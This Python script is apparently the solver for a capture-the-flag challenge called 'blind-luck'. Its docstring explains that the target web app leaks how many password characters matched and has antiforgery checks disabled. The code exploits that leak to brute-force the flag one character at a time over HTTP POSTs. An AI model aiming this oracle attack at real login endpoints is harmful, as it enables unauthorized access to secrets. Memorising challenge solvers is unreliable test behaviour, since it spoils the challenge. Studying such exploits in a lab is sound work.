#!/usr/bin/env python3
"""Solver for blind-luck.

Vulnerability: IndexModel.CheckPassword compares the submitted password to the
real flag byte-by-byte and stops at the first mismatch, returning how many
characters matched ("ticks"). OnPostCheckPassword always renders that count
back to the client as plain text: "Time taken: {ticks * 50}ms" -- regardless
of whether the guess succeeded or failed. This turns the endpoint into an
oracle: for any known prefix we can brute-force the next character by reading
how many characters matched, with no need for an actual timing side-channel
or for guessing the random "fail" flavor text (which is irrelevant noise).

The host app also disables the Razor Pages antiforgery filter globally
(Program.cs: ConfigureFilter(new IgnoreAntiforgeryTokenAttribute())), so no
CSRF token needs to be extracted -- a plain form POST is enough.
"""
import os
import re
import string
import sys

import requests

TIME_RE = re.compile(r"Time taken:\s*(\d+)ms")
SUCCESS_MARKER = "You succeeded"

# Characters observed in the flag format (lowercase hex-speak + underscore).
# Falls back to a broader charset if nothing in the primary set matches,
# so the solver keeps working even if the flag content changes.
PRIMARY_CHARSET = string.ascii_lowercase + string.digits + "_"
FALLBACK_CHARSET = string.ascii_letters + string.digits + "_-{}!?.@$"

MAX_LENGTH = 128


def get_endpoint() -> str:
    if "SERVICE_APP_MAIN_ENDPOINT" in os.environ:
        endpoint = os.environ["SERVICE_APP_MAIN_ENDPOINT"]
    elif "SERVICE_APP_MAIN_HOST" in os.environ:
        host = os.environ["SERVICE_APP_MAIN_HOST"]
        port = os.environ["SERVICE_APP_MAIN_PORT"]
        endpoint = f"http://{host}:{port}"
    else:
        endpoint = "http://localhost:8080"
    return endpoint.rstrip("/")


def check_password(session: requests.Session, base_url: str, password: str):
    resp = session.post(
        base_url + "/?handler=CheckPassword",
        data={"Password": password, "handler": "CheckPassword"},
        timeout=10,
    )
    resp.raise_for_status()
    text = resp.text

    if SUCCESS_MARKER in text:
        return True, None

    match = TIME_RE.search(text)
    if not match:
        raise RuntimeError(f"Could not find tick counter in response: {text!r}")

    ticks = int(match.group(1)) // 50
    return False, ticks


def main() -> int:
    base_url = get_endpoint()
    session = requests.Session()

    # Warm up / sanity check the index page is reachable.
    session.get(base_url + "/", timeout=10).raise_for_status()

    known = ""
    while len(known) < MAX_LENGTH:
        found = False
        for charset in (PRIMARY_CHARSET, FALLBACK_CHARSET):
            for ch in charset:
                guess = known + ch
                success, ticks = check_password(session, base_url, guess)
                if success:
                    # The comparison loop matched every character of `guess`
                    # and `guess` is exactly as long as the real secret, so
                    # `guess` itself (including this final character) is the
                    # complete flag.
                    print(f"Recovered flag: {guess}")
                    print(guess)
                    return 0
                if ticks == len(known) + 1:
                    known += ch
                    print(f"[+] position {len(known)}: {known!r}", file=sys.stderr)
                    found = True
                    break
            if found:
                break
        if not found:
            print(
                f"No candidate extended the match past {known!r}; giving up",
                file=sys.stderr,
            )
            return 1

    print("Hit MAX_LENGTH without recovering the flag", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
